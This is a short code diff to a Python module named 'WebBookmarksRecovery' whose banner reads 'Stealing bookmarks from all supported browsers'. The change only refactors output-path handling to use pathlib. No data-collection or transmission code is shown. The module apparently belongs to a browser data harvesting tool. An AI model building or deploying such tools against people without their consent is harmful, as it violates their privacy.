@@ -21,12 +21,11 @@ class WebBookmarksRecovery(ModuleManager):
   `-=========-`()       Stealing bookmarks from all supported browsers
                 """)
         
-        self.browsers_folder = os.path.join(self.output_folder_user, 'browsers')
-        self.output_filename_csv = os.path.join(self.browsers_folder, 'browser_bookmarks_all.csv')
-        self.output_filename_json = os.path.join(self.browsers_folder, 'browser_bookmarks_all.json')
+        self.browsers_folder = self.output_folder_user / 'browsers'
+        self.output_filename_csv = self.browsers_folder / 'browser_bookmarks_all.csv'
+        self.output_filename_json = self.browsers_folder / 'browser_bookmarks_all.json'
         
-        if not os.path.isdir(self.browsers_folder):
-            os.makedirs(self.browsers_folder)
+        self.browsers_folder.mkdir(parents=True, exist_ok=True)
 
     def run(self):
         try:
